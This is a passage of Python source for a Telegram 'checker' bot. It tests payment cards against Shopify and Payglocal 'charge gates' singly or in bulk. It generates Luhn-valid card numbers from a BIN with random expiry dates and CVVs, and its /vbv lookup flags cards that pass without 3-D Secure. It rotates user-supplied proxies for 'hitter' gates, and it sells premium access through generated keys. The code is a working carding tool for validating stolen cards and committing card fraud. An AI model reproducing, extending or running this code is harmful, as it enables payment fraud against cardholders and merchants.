        f"🎁 <b>Package:</b> <b>{dur_str}</b>\n"
        "🔄 <b>Status:</b> <b>GRANTED</b>\n"
        f"⏳ <b>Valid Till:</b> <b>{valid_str}</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "🎉 <i>Thank you for choosing our premium services!</i>\n"
        "▶️ <i>Hit /start to begin your journey.</i>"
    )
    await event.reply(receipt, parse_mode='html')


# ══════════════════════════════════════════════════════════════
#  /chk + /sp
# ══════════════════════════════════════════════════════════════
@bot.on(events.NewMessage(pattern=r'^/(?:sp|chk)(?:\s+(.+))?$'))
async def sp_command(event):
    uid = event.sender_id
    if not await enforce_force_join(event):
        return
    if await check_banned(event):
        return
    if await check_bot_status(event):
        await event.reply(premium_emoji("Bot OFF."), parse_mode='html'); return
    m = event.pattern_match
    cc_input = (m.group(1) or "").strip()
    if not cc_input:
        await event.reply(premium_emoji("❌ <b>Usage:</b> <code>/chk cc|mm|yy|cvv</code>\n\n<b>Example:</b>\n<code>/chk 4867966915738542|10|28|010</code>"), parse_mode='html')
        return
    cards = extract_cc(cc_input)
    if not cards:
        await event.reply(premium_emoji("❌ <b>Invalid CC format.</b>\n\n<b>Use:</b> <code>/chk cc|mm|yy|cvv</code>"), parse_mode='html'); return
    sites = load_sites_1_5() + load_sites_10_20()
    if not sites:
        await event.reply(premium_emoji("❌ No sites configured."), parse_mode='html'); return
    if len(cards) == 1:
        await run_shopify_single(event, uid, cards[0], sites)
    else:
        await run_shopify_mass(event, uid, sites, cards)


# ══════════════════════════════════════════════════════════════
#  /bulk + /msp
# ══════════════════════════════════════════════════════════════
@bot.on(events.NewMessage(pattern=r'^/(?:msp|bulk)\b'))
async def msp_command(event):
    uid = event.sender_id
    if not await enforce_force_join(event):
        return
    if await check_banned(event):
        return
    if await check_bot_status(event):
        await event.reply(premium_emoji("🔴 <b>Bot is OFF.</b>"), parse_mode='html'); return
    if not event.reply_to_msg_id:
        await event.reply(premium_emoji("❌ <b>Usage:</b> <code>/bulk</code> <b>Reply To txt</b>\n\n<b>How to use:</b>\n1. Upload a <code>.txt</code> file with cards\n2. Reply to that file with <code>/bulk</code>\n\n<b>Card format (one per line):</b>\n<code>4867966915738542|10|28|010</code>"), parse_mode='html')
        return
    rm = await event.get_reply_message()
    if not rm:
        await event.reply(premium_emoji("❌ Could not find the replied message."), parse_mode='html'); return
    content, error_message = await read_replied_text_file(rm)
    if error_message:
        await event.reply(premium_emoji(error_message), parse_mode='html'); return
    cards = extract_cc(content)
    if not cards:
        await event.reply(premium_emoji("❌ <b>No valid cards found.</b>"), parse_mode='html'); return
    sites = load_sites_1_5() + load_sites_10_20()
    if not sites:
        await event.reply(premium_emoji("❌ No sites configured."), parse_mode='html'); return
    await run_shopify_mass(event, uid, sites, cards)


# ══════════════════════════════════════════════════════════════
#  /bin
# ══════════════════════════════════════════════════════════════
@bot.on(events.NewMessage(pattern=r'^/bin(?:\s+(\d{6,8}))?$'))
async def bin_command(event):
    uid = event.sender_id
    if not await enforce_force_join(event):
        return
    if await check_banned(event):
        return
    if await check_bot_status(event):
        await event.reply(premium_emoji("🔴 <b>Bot is OFF.</b>"), parse_mode='html'); return
    m = event.pattern_match
    bin_num = m.group(1) if m else None
    if not bin_num:
        await event.reply(premium_emoji("🔢 <b>BIN Lookup</b>\n\n<b>Usage:</b>\n<blockquote>➡️ <code>/bin 486796</code></blockquote>"), parse_mode='html'); return
    if not bin_num.isdigit() or len(bin_num) < 6:
        await event.reply(premium_emoji("❌ <b>Invalid BIN.</b>"), parse_mode='html'); return
    sm = await event.reply(premium_emoji("💔 𝘗𝘳𝘰𝘤𝘦𝘴𝘴𝘪𝘯𝘨..."), parse_mode='html')
    try:
        brand, ctype, level, bank, country, ccode, flag = await get_bin_info(bin_num)
        text = (
            "🔢 <b>BIN Lookup Result</b>\n\n"
            "💠 <b>Card Info</b>\n"
            "<blockquote>"
            f"🔢 <b>BIN:</b> <code>{bin_num}</code>\n"
            f"🎖 <b>Brand:</b> <b>{_html.escape(str(brand), quote=False)}</b>\n"
            f"💳 <b>Type:</b> <b>{_html.escape(str(ctype), quote=False)}</b>\n"
            f"⭐ <b>Level:</b> <b>{_html.escape(str(level), quote=False)}</b>"
            "</blockquote>\n\n"
            "🏦 <b>Bank Info</b>\n"
            "<blockquote>"
            f"🏛 <b>Bank:</b> <b>{_html.escape(str(bank), quote=False)}</b>\n"
            f"🌍 <b>Country:</b> <b>{_html.escape(str(flag), quote=False)} {_html.escape(str(country), quote=False)}</b>"
            "</blockquote>"
        )
        await sm.edit(premium_emoji(text), parse_mode='html')
    except Exception as e:
        await sm.edit(premium_emoji(f"❌ <b>Lookup failed:</b> <code>{str(e)[:80]}</code>"), parse_mode='html')


# ══════════════════════════════════════════════════════════════
#  /gen
# ══════════════════════════════════════════════════════════════
@bot.on(events.NewMessage(pattern=r'^/gen(?:\s+(\d{6,8}))?$'))
async def gen_command(event):
    uid = event.sender_id
    if not await enforce_force_join(event):
        return
    if await check_banned(event):
        return
    if await check_bot_status(event):
        await event.reply(premium_emoji("🔴 <b>Bot is OFF.</b>"), parse_mode='html'); return
    m = event.pattern_match
    bin_num = m.group(1) if m else None
    if not bin_num:
        await event.reply(premium_emoji("🔢 <b>Card Generator</b>\n\n<b>Usage:</b>\n<blockquote>➡️ <code>/gen 486796</code></blockquote>"), parse_mode='html'); return
    if not bin_num.isdigit() or len(bin_num) < 6:
        await event.reply(premium_emoji("❌ <b>Invalid BIN.</b>"), parse_mode='html'); return
    cards = []
    for _ in range(10):
        remaining = 16 - len(bin_num)
        filler = ''.join(random.choices(string.digits, k=remaining))
        base = bin_num + filler
        def luhn_checksum(num_str):
            digits = [int(d) for d in num_str]
            for i in range(len(digits) - 2, -1, -2):
                digits[i] *= 2
                if digits[i] > 9:
                    digits[i] -= 9
            return sum(digits) % 10
        card_num = base
        for d in range(10):
            test = base[:-1] + str(d)
            if luhn_checksum(test) == 0:
                card_num = test
                break
        mm = f"{random.randint(1, 12):02d}"
        yy = str(random.randint(26, 30))
        cvv = f"{random.randint(100, 999)}"
        cards.append(f"{card_num}|{mm}|{yy}|{cvv}")
    try:
        brand, ctype, level, bank, country, ccode, flag = await get_bin_info(bin_num)
    except Exception:
        brand = ctype = level = bank = country = "-"
        flag = ""
    bank_clean = str(bank).replace(" - DEBIT", "").replace(" - CREDIT", "").strip()
    card_list = "\n".join([f"<code>{c}</code>" for c in cards])
    text = (
        "🎲 <b>Card Generator</b>\n\n"
        "💠 <b>BIN Info</b>\n"
        "<blockquote>"
        f"🔢 <b>BIN:</b> <code>{bin_num}</code>\n"
        f"🎖 <b>Brand:</b> <b>{_html.escape(str(brand), quote=False)}</b>\n"
        f"💳 <b>Type:</b> <b>{_html.escape(str(ctype), quote=False)}</b>\n"
        f"⭐ <b>Level:</b> <b>{_html.escape(str(level), quote=False)}</b>\n"
        f"🏛 <b>Bank:</b> <b>{_html.escape(bank_clean, quote=False)}</b>\n"
        f"🌍 <b>Country:</b> <b>{_html.escape(str(flag), quote=False)} {_html.escape(str(country), quote=False)}</b>"
        "</blockquote>\n\n"
        "🎯 <b>Generated Cards (10)</b>\n"
        f"<blockquote>{card_list}</blockquote>"
    )
    await event.reply(premium_emoji(text), parse_mode='html')


# ══════════════════════════════════════════════════════════════
#  /vbv
# ══════════════════════════════════════════════════════════════
@bot.on(events.NewMessage(pattern=r'^/vbv(?:\s+(.+))?$'))
async def vbv_command(event):
    uid = event.sender_id
    if not await enforce_force_join(event):
        return
    if await check_banned(event):
        return
    if await check_bot_status(event):
        await event.reply(premium_emoji("🔴 <b>Bot is OFF.</b>"), parse_mode='html'); return
    plan = get_user_plan(uid)
    is_paid = plan != "Free"
    if not is_paid and not is_admin(uid):
        await event.reply(premium_emoji("🔒 <b>VBV Lookup is Premium only.</b>\n\n💠 <b>Buy access:</b> <code>/pay</code>"), parse_mode='html'); return
    if not is_paid and not is_admin(uid):
        now = time.time()
        last = _vbv_cooldown.get(uid, 0)
        elapsed = now - last
        if elapsed < VBV_COOLDOWN_SECONDS:
            remaining = int(VBV_COOLDOWN_SECONDS - elapsed) + 1
            await event.reply(premium_emoji(f"⏳ <b>Please wait {remaining} seconds</b>"), parse_mode='html'); return
        _vbv_cooldown[uid] = now
    m = event.pattern_match
    card_details = (m.group(1) or "").strip()
    if not card_details:
        await event.reply(premium_emoji("🔐 <b>VBV Lookup</b>\n\n<b>Usage:</b>\n<blockquote>➡️ <code>/vbv card|mm|yy|cvv</code></blockquote>"), parse_mode='html'); return
    parsed = parse_vbv_card(card_details)
    if not parsed:
        await event.reply(premium_emoji("❌ <b>Invalid card format.</b>\n\nUse: <code>/vbv card|mm|yy|cvv</code>"), parse_mode='html'); return
    card_number = parsed[0]
    bin_num = card_number[:6]
    sm = await event.reply(premium_emoji("💔 𝘗𝘳𝘰𝘤𝘦𝘴𝘴𝘪𝘯𝘨..."), parse_mode='html')
    api_response = await vbv_check_card(card_details)
    if "error" in api_response:
        await sm.edit(premium_emoji(f"⚠️ <b>VBV Error:</b> <code>{_html.escape(str(api_response['error']), quote=False)}</code>"), parse_mode='html'); return
    brand, ctype, level, bank, country, ccode, flag = await get_bin_info(bin_num)
    response_text = str(api_response.get("response", "N/A"))
    response_clean = response_text.replace("\\", "").replace("/", "").replace('"', "").replace("'", "")
    response_clean = _html.escape(response_clean, quote=False)
    rl = response_text.lower()
    if "successful" in rl or "non vbv" in rl or "no 3d" in rl:
        status_line = "✅ <b>NON VBV</b>"
    elif "vbv" in rl or "3d" in rl or "msc" in rl:
        status_line = "❌ <b>VBV REQUIRED</b>"
    elif "challenge" in rl:
        status_line = "❌ <b>DECLINED</b>"
    else:
        status_line = "❓ <b>UNKNOWN</b>"
    brand_e = _html.escape(str(brand), quote=False)
    bank_e = _html.escape(str(bank), quote=False)
    country_e = _html.escape(str(country), quote=False)
    flag_e = _html.escape(str(flag), quote=False)
    card_e = _html.escape(str(card_details), quote=False)
    try:
        ent = await event.get_sender()
        uname = getattr(ent, "username", None)
        fname = getattr(ent, "first_name", None)
        user_link = format_username(username=uname, user_id=uid, display=fname or "User")
    except Exception:
        user_link = format_username(user_id=uid, display="User")
    text = (
        "🔐 <b>VBV Lookup Result</b>\n\n"
        "💠 <b>Status</b>\n"
        f"<blockquote>{status_line}</blockquote>\n\n"
        "💳 <b>Card</b>\n"
        f"<blockquote><code>{card_e}</code></blockquote>\n\n"
        "📋 <b>Response</b>\n"
        f"<blockquote><code>{response_clean}</code></blockquote>\n\n"
        "🏦 <b>BIN Info</b>\n"
        "<blockquote>"
        f"🎖 <b>Brand:</b> <b>{brand_e}</b>\n"
        f"🏛 <b>Bank:</b> <b>{bank_e}</b>\n"
        f"🌍 <b>Country:</b> <b>{flag_e} {country_e}</b>"
        "</blockquote>\n\n"
        f"👤 <b>User:</b> {user_link}\n"
        f"💠 <b>Dev:</b> {dev_link()}"
    )
    if not is_admin(uid):
        deduct_credits(uid, 1)
    await sm.edit(premium_emoji(text), parse_mode='html')


# ══════════════════════════════════════════════════════════════
#  /pxy /hpx /rempx /hpx all
# ══════════════════════════════════════════════════════════════
@bot.on(events.NewMessage(pattern=r'^/pxy(?:\s+(?!all\b).+)?$'))
async def pxy_command(event):
    uid = event.sender_id
    if await check_banned(event):
        return
    if await check_bot_status(event):
        await event.reply(premium_emoji("🔴 <b>Bot is OFF.</b>"), parse_mode='html'); return
    if event.reply_to_msg_id:
        rm = await event.get_reply_message()
        if not rm.file or not rm.file.name.endswith('.txt'):
            await event.reply(premium_emoji("❌ Reply to a .txt file."), parse_mode='html'); return
        fp = await rm.download_media()
        async with aiofiles.open(fp, 'r', encoding='utf-8', errors='ignore') as f:
            content = await f.read()
        try:
            os.remove(fp)
        except Exception:
            pass
    else:
        parts = event.message.text.split('\n', 1)
        if len(parts) < 2:
            await event.reply(premium_emoji("💗 <b>Charge Gate Proxy</b>\n\n<blockquote>➡️ <code>/pxy ip:port:user:pass</code>\n➡️ <code>/pxy</code> Reply to a <code>.txt</code></blockquote>"), parse_mode='html'); return
        content = parts[1]
    raw = [l.strip() for l in content.split('\n') if l.strip()]
    proxies = []
    invalid = 0
    for r in raw:
        n = normalize_proxy(r)
        if n:
            proxies.append(n)
        else:
            invalid += 1
    if not proxies:
        await event.reply(premium_emoji(f"❌ <b>No valid proxies.</b>\nInvalid: <b>{invalid}</b>"), parse_mode='html'); return
    cur = load_user_proxies(uid, "shopify")
    already_added = len([p for p in proxies if p in cur])
    to_test = [p for p in proxies if p not in cur]
    if not to_test:
        await event.reply(premium_emoji(
            "✅ <b>PROXY VALIDATION COMPLETE</b>\n"
            "\n"
            f"📌 <b>Total Input:</b> <b>{len(raw)}</b>\n"
            f"❌ <b>Invalid Format:</b> <b>{invalid}</b>\n"
            f"⚠️ <b>Already Added:</b> <b>{already_added}</b>\n"
            "📊 <b>Checked:</b> <b>0/0</b>\n"
            "💀 <b>Dead:</b> <b>0</b>\n"
            "✅ <b>Working Added:</b> <b>0 (Saved to Profile)</b>"
        ), parse_mode='html'); return
    sm = await event.reply(premium_emoji(f"🔄 <b>Testing {len(to_test)} proxies...</b>\n\n✅ Alive ➳ 0\n❌ Dead ➳ 0"), parse_mode='html')
    alive = []
    sem = asyncio.Semaphore(20)
    async def chk(p):
        async with sem:
            if await test_proxy(p):
                alive.append(p)
    await asyncio.gather(*[asyncio.create_task(chk(p)) for p in to_test])
    added = list(alive)
    cur.extend(added)
    save_user_proxies(uid, cur, "shopify")
    await sm.edit(premium_emoji(
        "✅ <b>PROXY VALIDATION COMPLETE</b>\n"
        "\n"
        f"📌 <b>Total Input:</b> <b>{len(raw)}</b>\n"
        f"❌ <b>Invalid Format:</b> <b>{invalid}</b>\n"
        f"⚠️ <b>Already Added:</b> <b>{already_added}</b>\n"
        f"📊 <b>Checked:</b> <b>{len(to_test)}/{len(proxies)}</b>\n"
        f"💀 <b>Dead:</b> <b>{len(to_test) - len(alive)}</b>\n"
        f"✅ <b>Working Added:</b> <b>{len(added)} (Saved to Profile)</b>"
    ), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/hpx(?:\s+(?!all\b).+)?$'))
async def hpx_command(event):
    uid = event.sender_id
    if await check_banned(event):
        return
    if await check_bot_status(event):
        await event.reply(premium_emoji("🔴 <b>Bot is OFF.</b>"), parse_mode='html'); return
    if event.reply_to_msg_id:
        rm = await event.get_reply_message()
        if not rm.file or not rm.file.name.endswith('.txt'):
            await event.reply(premium_emoji("❌ Reply to a .txt file."), parse_mode='html'); return
        fp = await rm.download_media()
        async with aiofiles.open(fp, 'r', encoding='utf-8', errors='ignore') as f:
            content = await f.read()
        try:
            os.remove(fp)
        except Exception:
            pass
    else:
        parts = event.message.text.split('\n', 1)
        if len(parts) < 2:
            await event.reply(premium_emoji("💗 <b>Hitter Gate Proxy</b>\n\n<blockquote>➡️ <code>/hpx ip:port:user:pass</code>\n➡️ <code>/hpx</code> Reply to a <code>.txt</code></blockquote>"), parse_mode='html'); return
        content = parts[1]
    raw = [l.strip() for l in content.split('\n') if l.strip()]
    proxies = []
    invalid = 0
    for r in raw:
        n = normalize_proxy(r)
        if n:
            proxies.append(n)
        else:
            invalid += 1
    if not proxies:
        await event.reply(premium_emoji(f"❌ <b>No valid proxies.</b>\nInvalid: <b>{invalid}</b>"), parse_mode='html'); return
    cur = load_user_proxies(uid, "hitter")
    already_added = len([p for p in proxies if p in cur])
    to_test = [p for p in proxies if p not in cur]
    if not to_test:
        await event.reply(premium_emoji(
            "✅ <b>PROXY VALIDATION COMPLETE</b>\n"
            "\n"
            f"📌 <b>Total Input:</b> <b>{len(raw)}</b>\n"
            f"❌ <b>Invalid Format:</b> <b>{invalid}</b>\n"
            f"⚠️ <b>Already Added:</b> <b>{already_added}</b>\n"
            "📊 <b>Checked:</b> <b>0/0</b>\n"
            "💀 <b>Dead:</b> <b>0</b>\n"
            "✅ <b>Working Added:</b> <b>0 (Saved to Profile)</b>"
        ), parse_mode='html'); return
    sm = await event.reply(premium_emoji(f"🔄 <b>Testing {len(to_test)} proxies...</b>\n\n✅ Alive ➳ 0\n❌ Dead ➳ 0"), parse_mode='html')
    alive = []
    sem = asyncio.Semaphore(20)
    async def chk(p):
        async with sem:
            if await test_proxy(p):
                alive.append(p)
    await asyncio.gather(*[asyncio.create_task(chk(p)) for p in to_test])
    added = list(alive)
    cur.extend(added)
    save_user_proxies(uid, cur, "hitter")
    await sm.edit(premium_emoji(
        "✅ <b>PROXY VALIDATION COMPLETE</b>\n"
        "\n"
        f"📌 <b>Total Input:</b> <b>{len(raw)}</b>\n"
        f"❌ <b>Invalid Format:</b> <b>{invalid}</b>\n"
        f"⚠️ <b>Already Added:</b> <b>{already_added}</b>\n"
        f"📊 <b>Checked:</b> <b>{len(to_test)}/{len(proxies)}</b>\n"
        f"💀 <b>Dead:</b> <b>{len(to_test) - len(alive)}</b>\n"
        f"✅ <b>Working Added:</b> <b>{len(added)} (Saved to Profile)</b>"
    ), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/rempx\s+all$'))
async def rempx_all_command(event):
    uid = event.sender_id
    if await check_banned(event):
        return
    pf = get_user_proxy_file(uid, "shopify")
    if not os.path.exists(pf):
        await event.reply(premium_emoji("❌ <b>No proxies found for Charge Gate.</b>"), parse_mode='html'); return
    try:
        os.remove(pf)
        await event.reply(premium_emoji("🗑️ <b>All Charge proxies removed</b>\n\n<blockquote>✅ <b>Pool is now empty.</b></blockquote>"), parse_mode='html')
    except Exception as e:
        await event.reply(premium_emoji(f"❌ <b>Failed:</b> <code>{str(e)[:80]}</code>"), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/hpx\s+all$'))
async def hpx_all_command(event):
    uid = event.sender_id
    if await check_banned(event):
        return
    pf = get_user_proxy_file(uid, "hitter")
    if not os.path.exists(pf):
        await event.reply(premium_emoji("❌ <b>No proxies found for Hitter Gate.</b>"), parse_mode='html'); return
    try:
        os.remove(pf)
        await event.reply(premium_emoji("🗑️ <b>All Hitter proxies removed</b>\n\n<blockquote>✅ <b>Pool is now empty.</b></blockquote>"), parse_mode='html')
    except Exception as e:
        await event.reply(premium_emoji(f"❌ <b>Failed:</b> <code>{str(e)[:80]}</code>"), parse_mode='html')


# ══════════════════════════════════════════════════════════════
#  /stop /status /clearproxies /shuffle
# ══════════════════════════════════════════════════════════════
@bot.on(events.NewMessage(pattern=r'^/stop$'))
async def stop_command(event):
    uid = event.sender_id
    if await check_banned(event):
        return
    stopped = 0
    for sid, sess in list(MASS_SESSIONS.items()):
        if sess.get("uid") == uid:
            sess["stop"] = True
            stopped += 1
    if stopped:
        await event.reply(premium_emoji(f"⛔ <b>Stopped {stopped} active session(s).</b>"), parse_mode='html')
    else:
        await event.reply(premium_emoji("❌ <b>No active session to stop.</b>"), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/status$'))
async def status_command(event):
    uid = event.sender_id
    if await check_banned(event):
        return
    active = sum(1 for s in MASS_SESSIONS.values() if s.get("uid") == uid)
    await event.reply(premium_emoji(
        "⚡ <b>System Status</b>\n\n"
        "<blockquote>"
        "🟢 <b>Bot:</b> <b>Online</b>\n"
        f"⚙️ <b>Shopify Gate:</b> <b>{'ON' if gate_enabled('shopify') else 'OFF'}</b>\n"
        f"📊 <b>Active Sessions:</b> <b>{active}</b>\n"
        f"🔗 <b>Your Proxies:</b> <b>{len(load_user_proxies(uid, 'shopify'))}</b>"
        "</blockquote>"
    ), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/clearproxies$'))
async def clearproxies_command(event):
    uid = event.sender_id
    if await check_banned(event):
        return
    proxies = load_user_proxies(uid, "shopify")
    if not proxies:
        await event.reply(premium_emoji("❌ <b>No proxies to test.</b>"), parse_mode='html'); return
    sm = await event.reply(premium_emoji("🔄 <b>Testing your proxies...</b>"), parse_mode='html')
    alive = []
    sem = asyncio.Semaphore(20)
    async def chk(p):
        async with sem:
            if await test_proxy(p):
                alive.append(p)
    await asyncio.gather(*[asyncio.create_task(chk(p)) for p in proxies])
    save_user_proxies(uid, alive, "shopify")
    await sm.edit(premium_emoji(f"✅ <b>Done</b>\n\n<blockquote>📦 <b>Kept:</b> <b>{len(alive)}</b>\n❌ <b>Removed:</b> <b>{len(proxies) - len(alive)}</b></blockquote>"), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/shuffle$'))
async def shuffle_command(event):
    uid = event.sender_id
    if await check_banned(event):
        return
    proxies = load_user_proxies(uid, "shopify")
    if not proxies:
        await event.reply(premium_emoji("❌ <b>No proxies to shuffle.</b>"), parse_mode='html'); return
    random.shuffle(proxies)
    save_user_proxies(uid, proxies, "shopify")
    await event.reply(premium_emoji(f"🔄 <b>Rotation Reset</b>\n\n<blockquote>🔀 <b>{len(proxies)} proxies shuffled.</b></blockquote>"), parse_mode='html')


# ══════════════════════════════════════════════════════════════
#  /key
# ══════════════════════════════════════════════════════════════
@bot.on(events.NewMessage(pattern=r'^/key\s+'))
async def key_command(event):
    if not is_admin(event.sender_id):
        return
    a = event.message.text.split()
    if len(a) < 3:
        await event.reply(premium_emoji("❌ <code>/key AMOUNT DURATION PLAN</code>\n\n<b>Examples:</b>\n<code>/key 1 1h Elite</code>\n<code>/key 5 30m Core</code>"), parse_mode='html'); return
    try:
        amount = int(a[1])
    except Exception:
        await event.reply(premium_emoji("❌ Amount must be number."), parse_mode='html'); return
    duration = parse_duration(a[2])
    if not duration:
        await event.reply(premium_emoji("❌ Invalid duration."), parse_mode='html'); return
    plan = " ".join(a[3:]).strip()
    if plan not in VALID_PLANS:
        await event.reply(premium_emoji(f"❌ Invalid plan. Use: {', '.join(VALID_PLANS)}"), parse_mode='html'); return
    if amount < 1 or amount > 50:
        await event.reply(premium_emoji("❌ Amount must be 1-50."), parse_mode='html'); return
    days, hours, minutes = duration
    kd = load_json_file(KEYS_FILE, {})
    keys = []
    for _ in range(amount):
        k = "MN-" + generate_key(6)
        while k in kd:
            k = "MN-" + generate_key(6)
        kd[k] = {'plan':plan, 'days':days, 'hours':hours, 'minutes':minutes,
                 'created_by':event.sender_id, 'created_at':datetime.now().isoformat(),
                 'used_by':None, 'used_count':0}
        keys.append(k)
    save_json_file(KEYS_FILE, kd)
    keys_lines = "\n".join([f"↕️ <code>{k}</code>" for k in keys])
    try:
        creator = await bot.get_entity(event.sender_id)
        c_uname = getattr(creator, "username", None)
        c_fname = getattr(creator, "first_name", None)
        creator_link = format_username(username=c_uname, user_id=event.sender_id, display=c_fname or "Admin")
    except Exception:
        creator_link = format_username(user_id=event.sender_id, display="Admin")
    text = (
        "🦋 <b>Key Generated Successfully</b>\n"
        "\n"
        f"{keys_lines}\n"
        "-------------------------------\n"
        f"<code>/redeem {keys[0]}</code>\n"
        "\n"
        f"⭐ <b>Created By</b> {creator_link} 🙂"
    )
    await event.reply(premium_emoji(text), parse_mode='html')


# ══════════════════════════════════════════════════════════════
#  CALLBACK ROUTER
# ══════════════════════════════════════════════════════════════
@bot.on(events.CallbackQuery)
async def callback_router(event):
    uid = event.sender_id
    data = event.data.decode('utf-8')
    if is_killed():
        await event.answer("Bot is dead.", alert=True); return
    if await check_banned(event):
        await event.answer("Banned", alert=True); return

    if data != "verify_join" and not is_admin(uid):
        joined = await is_user_joined(uid)
        if not joined:
            await event.answer("❌ Join channels first!", alert=True)
            try:
                await event.respond(premium_emoji(
                    "🚫 <b>You Unable To Use This Bot</b>\n"
                    "\n"
                    "<b>Because You Didn't Join Channel/Group</b> ▶️\n"
                    "\n"
                    "/start <b>To Join Channel And Use Bot</b> ▶️"
                ), parse_mode='html')
            except Exception:
                pass
            return

    if data == "verify_join":
        if not await is_user_joined(uid):
            await event.answer("❌ Join all first!", alert=True); return
        await event.answer("✅ Verified!", alert=True)
        try:
            s = await event.get_sender()
            username = s.username if s.username else f"user_{uid}"
        except Exception:
            s, username = None, f"user_{uid}"
        await create_user_if_not_exists(uid, username)
        text = build_main_menu_text(uid, s)
        try:
            await event.delete()
        except Exception:
            pass
        await event.respond(text, buttons=get_main_keyboard(uid), parse_mode='html')
        return

    if data == "main_menu":
        sender = None
        try:
            sender = await event.get_sender()
        except Exception:
            pass
        text = build_main_menu_text(uid, sender)
        try:
            await event.edit(text, buttons=get_main_keyboard(uid), parse_mode='html')
        except Exception:
            await event.respond(text, buttons=get_main_keyboard(uid), parse_mode='html')
        await event.answer(); return

    if data == "menu_check":
        await event.answer()
        text = premium_emoji(
            "💡 <b>Quick Commands Menu</b>\n\n"
            "💠 <b>Top Commands</b>\n"
            "<blockquote>"
            "› <code>/chk</code> — Single check\n"
            "› <code>/bulk</code> — Mass check\n"
            "› <code>/pg</code> — Payglocal single\n"
            "› <code>/bin</code> — BIN Lookup\n"
            "› <code>/gen</code> — Card Generator\n"
            "› <code>/vbv</code> — VBV Lookup"
            "</blockquote>\n\n"
            "🌐 <b>Utilities</b>\n"
            "<blockquote>"
            "› <code>/stop</code> — Stop active tasks\n"
            "› <code>/status</code> — System status\n"
            "› <code>/pxy</code> — Add charge proxies\n"
            "› <code>/hpx</code> — Add hitter proxies"
            "</blockquote>"
        )
        kb = [
            [Button.inline("Detailed Help", b"check_help", style="primary", icon=premium_icon("📋")),
             Button.inline("Gateways", b"menu_gate", style="primary", icon=premium_icon("🏪"))],
            [Button.inline("Sites", b"pxy_sites", style="primary", icon=premium_icon("🌐")),
             Button.inline("Proxies", b"pxy_list", style="primary", icon=premium_icon("🔗"))],
            [Button.inline("« Back to Menu", b"main_menu", style="danger")],
        ]
        try:
            await event.edit(text, buttons=kb, parse_mode='html')
        except Exception:
            await event.respond(text, buttons=kb, parse_mode='html')
        return

    if data == "check_help":
        await event.answer()
        text = premium_emoji(
            "📋 <b>Detailed Help</b>\n\n"
            "💠 <b>Single Check</b>\n"
            "<blockquote>› <b>Command:</b> <code>/chk cc|mm|yy|cvv</code></blockquote>\n\n"
            "💠 <b>Mass Check</b>\n"
            "<blockquote>› <b>Command:</b> Reply to a <code>.txt</code> with <code>/bulk</code></blockquote>\n\n"
            "💠 <b>Proxy Setup</b>\n"
            "<blockquote>› <b>Charge:</b> <code>/pxy ip:port:user:pass</code>\n"
            "› <b>Hitter:</b> <code>/hpx ip:port:user:pass</code></blockquote>"
        )
        kb = [[Button.inline("« Back", b"menu_check", style="danger")]]
        try:
            await event.edit(text, buttons=kb, parse_mode='html')
        except Exception:
            await event.respond(text, buttons=kb, parse_mode='html')
        return

    if data == "menu_gate":
        try:
            await event.edit(get_gate_menu_text(), buttons=get_gate_menu_keyboard(), parse_mode='html')
        except Exception:
            await event.respond(get_gate_menu_text(), buttons=get_gate_menu_keyboard(), parse_mode='html')
        await event.answer(); return

    if data == "gate_charge":
        text = premium_emoji(
            "⚡ <b>Charge &amp; Hitter Gate</b>\n\n"
            "💔 𝘚𝘦𝘭𝘦𝘤𝘵 𝘢 𝘱𝘳𝘦𝘮𝘪𝘶𝘮 𝘩𝘪𝘵𝘵𝘦𝘳 𝘵𝘰 𝘱𝘳𝘰𝘤𝘦𝘴𝘴 𝘺𝘰𝘶𝘳 𝘤𝘢𝘳𝘥𝘴\n\n"
            "💠 <b>Premium Gates</b>\n"
            "<blockquote>"
            "➡️ <code>/chk</code>  ➡️  <b>Shopi Single</b>\n"
            "➡️ <code>/bulk</code>  ➡️  <b>Shopi Mass</b>\n"
            "➡️ <code>/pg</code>  ➡️  <b>Payglocal Single</b>"
            "</blockquote>\n\n"
            "💠 <b>Hitter Gates</b>\n"
            "<blockquote>➡️ <code>/jio</code>  ➡️  <b>Jio Hitter</b></blockquote>"
        )
        kb = [[Button.inline("« Back", b"menu_gate", style="danger")]]
        try:
            await event.edit(text, buttons=kb, parse_mode='html')
        except Exception:
            await event.respond(text, buttons=kb, parse_mode='html')
        await event.answer(); return

    if data == "gate_auth":
        text = premium_emoji(
            "⚡ <b>Auth Gate</b>\n\n"
            "💔 𝘚𝘦𝘭𝘦𝘤𝘵 𝘢 𝘱𝘳𝘦𝘮𝘪𝘶𝘮 𝘢𝘶𝘵𝘩 𝘨𝘢𝘵𝘦 𝘵𝘰 𝘱𝘳𝘰𝘤𝘦𝘴𝘴 𝘺𝘰𝘶𝘳 𝘤𝘢𝘳𝘥𝘴.\n\n"
            "💠 <b>Auth Gates</b>\n"
            "<blockquote>🔒 <b>Closed Due to Testing</b>\n⏳ <b>Will Open Soon</b></blockquote>\n\n"
            "💬 <b>Contact Owner For Updates</b> ❤️"
        )
        kb = [[Button.inline("« Back", b"menu_gate", style="danger")]]
        try:
            await event.edit(text, buttons=kb, parse_mode='html')
        except Exception:
            await event.respond(text, buttons=kb, parse_mode='html')
        await event.answer(); return

    if data == "pxy_sites":
        if not is_admin(uid):
            await event.answer("Not Access", alert=True); return
        text = premium_emoji(
            "<b>Site Center</b> ✅\n\n"
            "💗 <b>Adding Site Usage</b> ⚙️\n"
            "<blockquote>➡️ <code>/Site</code>\n➡️ <code>/Site</code> <b>Reply To txt</b></blockquote>\n\n"
            "💗 <b>Site Remove Usage</b> ⚙️\n"
            "<blockquote>➡️ <code>/remall</code></blockquote>"
        )
        kb = [[Button.inline("« Back", b"main_menu", style="danger")]]
        try:
            await event.edit(text, buttons=kb, parse_mode='html')
        except Exception:
            await event.respond(text, buttons=kb, parse_mode='html')
        await event.answer(); return

    if data == "pxy_list":
        text = premium_emoji(
            "<b>Proxy Center</b> ✅\n\n"
            "💗 <b>Charge Gate Proxy Usage</b> ⚙️\n"
            "<blockquote>➡️ <code>/pxy</code>\n➡️ <code>/pxy</code> <b>Reply To txt</b></blockquote>\n\n"
            "💗 <b>Hitter Gate Proxy Usage</b> ⚙️\n"
            "<blockquote>➡️ <code>/hpx</code>\n➡️ <code>/hpx</code> <b>Reply To txt</b></blockquote>"
        )
